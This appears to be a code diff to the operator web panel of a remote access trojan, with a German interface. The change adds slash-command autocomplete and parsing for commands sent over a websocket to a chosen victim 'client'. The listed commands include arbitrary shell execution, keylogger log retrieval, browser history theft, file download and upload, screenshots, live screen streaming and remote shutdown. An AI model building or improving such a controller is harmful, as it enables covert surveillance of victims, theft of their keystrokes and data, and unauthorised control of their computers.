@@ -119,6 +119,38 @@
       #upload-input {
         display: none;
       }
+      /* --- Discord-Style Command Suggestion --- */
+      #command-suggest {
+        position: absolute;
+        background: #23272a;
+        color: #fff;
+        border-radius: 6px;
+        box-shadow: 0 4px 16px #000a;
+        min-width: 220px;
+        max-width: 350px;
+        z-index: 1000;
+        margin-top: 2px;
+        padding: 4px 0;
+        font-size: 1em;
+        display: none;
+      }
+      #command-suggest .suggest-item {
+        padding: 8px 16px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+      }
+      #command-suggest .suggest-item.selected,
+      #command-suggest .suggest-item:hover {
+        background: #5865f2;
+        color: #fff;
+      }
+      #command-suggest .suggest-desc {
+        color: #b9bbbe;
+        font-size: 0.95em;
+        margin-left: 10px;
+        flex: 1;
+      }
       @media (max-width: 900px) {
         body {
           flex-direction: column;
@@ -142,12 +174,14 @@
 
     <div id="main-panel" class="panel">
       <div id="output"></div>
-      <div id="controls">
+      <div id="controls" style="position:relative;">
         <input
           type="text"
           id="command-input"
           placeholder="Befehle: exec, screenshot, download, history, keylogger, ls, systeminfo"
+          autocomplete="off"
         />
+        <div id="command-suggest"></div>
         <button id="send-button">Senden</button>
         <button class="quick-btn" id="btn-systeminfo" title="Systeminfo">Systeminfo</button>
         <button class="quick-btn" id="btn-ls" title="Verzeichnis auflisten">ls</button>
@@ -230,7 +264,142 @@
         screenStatus.textContent = '';
       }
 
-      // --- Befehl senden ---
+      // --- Discord-Style Command Suggestion ---
+      const commandInput = document.getElementById("command-input");
+      const commandSuggest = document.getElementById("command-suggest");
+
+      // Liste der verfügbaren Befehle
+      const COMMANDS = [
+        { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
+        { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
+        { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
+        { cmd: "/upload", desc: "Datei zum Client hochladen" },
+        { cmd: "/history", desc: "Browserverlauf anzeigen" },
+        { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
+        { cmd: "/ls", desc: "Verzeichnis auflisten" },
+        { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
+        { cmd: "/shutdown", desc: "Client herunterfahren" },
+        { cmd: "/restart", desc: "Client neustarten" },
+        { cmd: "/screenstream_start", desc: "Live-Screen starten" },
+        { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
+      ];
+
+      let suggestActive = false;
+      let suggestItems = [];
+      let suggestIndex = 0;
+
+      function showSuggest(filtered) {
+        if (!filtered.length) {
+          commandSuggest.style.display = "none";
+          suggestActive = false;
+          return;
+        }
+        commandSuggest.innerHTML = "";
+        filtered.forEach((item, idx) => {
+          const div = document.createElement("div");
+          div.className = "suggest-item" + (idx === suggestIndex ? " selected" : "");
+          div.innerHTML = `<span>${item.cmd}</span><span class="suggest-desc">${item.desc}</span>`;
+          div.addEventListener("mousedown", (e) => {
+            e.preventDefault();
+            selectSuggest(idx, filtered);
+          });
+          commandSuggest.appendChild(div);
+        });
+        // Positionierung
+        const rect = commandInput.getBoundingClientRect();
+        commandSuggest.style.left = commandInput.offsetLeft + "px";
+        commandSuggest.style.top = (commandInput.offsetTop + commandInput.offsetHeight) + "px";
+        commandSuggest.style.width = commandInput.offsetWidth + "px";
+        commandSuggest.style.display = "block";
+        suggestActive = true;
+      }
+
+      function hideSuggest() {
+        commandSuggest.style.display = "none";
+        suggestActive = false;
+      }
+
+      function selectSuggest(idx, filtered) {
+        const cmd = filtered[idx].cmd;
+        commandInput.value = cmd + " ";
+        hideSuggest();
+        commandInput.focus();
+      }
+
+      commandInput.addEventListener("input", (e) => {
+        const val = commandInput.value;
+        if (val.startsWith("/")) {
+          const filtered = COMMANDS.filter(c =>
+            c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
+          );
+          suggestItems = filtered;
+          suggestIndex = 0;
+          showSuggest(filtered);
+        } else {
+          hideSuggest();
+        }
+      });
+
+      commandInput.addEventListener("keydown", (e) => {
+        if (!suggestActive) return;
+        if (e.key === "ArrowDown") {
+          suggestIndex = (suggestIndex + 1) % suggestItems.length;
+          showSuggest(suggestItems);
+          e.preventDefault();
+        } else if (e.key === "ArrowUp") {
+          suggestIndex = (suggestIndex - 1 + suggestItems.length) % suggestItems.length;
+          showSuggest(suggestItems);
+          e.preventDefault();
+        } else if (e.key === "Enter") {
+          if (suggestActive && suggestItems.length) {
+            selectSuggest(suggestIndex, suggestItems);
+            e.preventDefault();
+          }
+        } else if (e.key === "Escape") {
+          hideSuggest();
+        }
+      });
+
+      commandInput.addEventListener("blur", () => {
+        setTimeout(hideSuggest, 100); // Verzögert, damit Klick auf Vorschlag funktioniert
+      });
+
+      // --- Mapping für /-Befehle zu echten Aktionen ---
+      function parseSlashCommand(val) {
+        if (!val.startsWith("/")) return null;
+        const [cmd, ...args] = val.trim().split(" ");
+        switch (cmd) {
+          case "/exec":
+            return { action: "exec", command: args.join(" ") };
+          case "/screenshot":
+            return { action: "screenshot" };
+          case "/download":
+            return { action: "download", path: args.join(" ") };
+          case "/upload":
+            // handled by upload button
+            return null;
+          case "/history":
+            return { action: "history", limit: parseInt(args[0]) || 20 };
+          case "/keylogger":
+            return { action: "keylogger", count: parseInt(args[0]) || 50 };
+          case "/ls":
+            return { action: "ls", path: args.join(" ") || "." };
+          case "/systeminfo":
+            return { action: "systeminfo" };
+          case "/shutdown":
+            return { action: "shutdown" };
+          case "/restart":
+            return { action: "restart" };
+          case "/screenstream_start":
+            return { action: "screenstream_start" };
+          case "/screenstream_stop":
+            return { action: "screenstream_stop" };
+          default:
+            return null;
+        }
+      }
+
+      // --- Befehl senden (angepasst für /-Befehle) ---
       function sendCommand(customPayload = null) {
         if (!selectedClientId) {
           log("Fehler: Kein Client ausgewählt.", "error");
@@ -241,41 +410,47 @@
           payload = { target_id: selectedClientId, ...customPayload };
         } else {
           const commandText = commandInput.value.trim();
-          if (!commandText) return;
-          const parts = commandText.split(" ");
-          const action = parts[0].toLowerCase();
-          const argument = parts.slice(1).join(" ");
-          payload = {
-            target_id: selectedClientId,
-            action: action,
-          };
-          switch (action) {
-            case "exec":
-              payload.command = argument;
-              break;
-            case "download":
-              payload.path = argument;
-              break;
-            case "history":
-              payload.limit = parseInt(argument) || 20;
-              break;
-            case "keylogger":
-              payload.count = parseInt(argument) || 50;
-              break;
-            case "ls":
-              payload.path = argument || ".";
-              break;
-            case "screenshot":
-            case "systeminfo":
-            case "shutdown":
-            case "restart":
-              break;
-            default:
-              log(
-                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
-                "error"
-              );
-              return;
+          // Discord-Style: /-Befehle parsen
+          let slashPayload = parseSlashCommand(commandText);
+          if (slashPayload) {
+            payload = { target_id: selectedClientId, ...slashPayload };
+          } else {
+            if (!commandText) return;
+            const parts = commandText.split(" ");
+            const action = parts[0].toLowerCase();
+            const argument = parts.slice(1).join(" ");
+            payload = {
+              target_id: selectedClientId,
+              action: action,
+            };
+            switch (action) {
+              case "exec":
+                payload.command = argument;
+                break;
+              case "download":
+                payload.path = argument;
+                break;
+              case "history":
+                payload.limit = parseInt(argument) || 20;
+                break;
+              case "keylogger":
+                payload.count = parseInt(argument) || 50;
+                break;
+              case "ls":
+                payload.path = argument || ".";
+                break;
+              case "screenshot":
+              case "systeminfo":
+              case "shutdown":
+              case "restart":
+                break;
+              default:
+                log(
+                  "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
+                  "error"
+                );
+                return;
+            }
           }
         }
         ws.send(JSON.stringify(payload));
@@ -286,6 +461,7 @@
           "cmd"
         );
         commandInput.value = "";
+        hideSuggest();
       }
 
       // --- Event-Handler ---
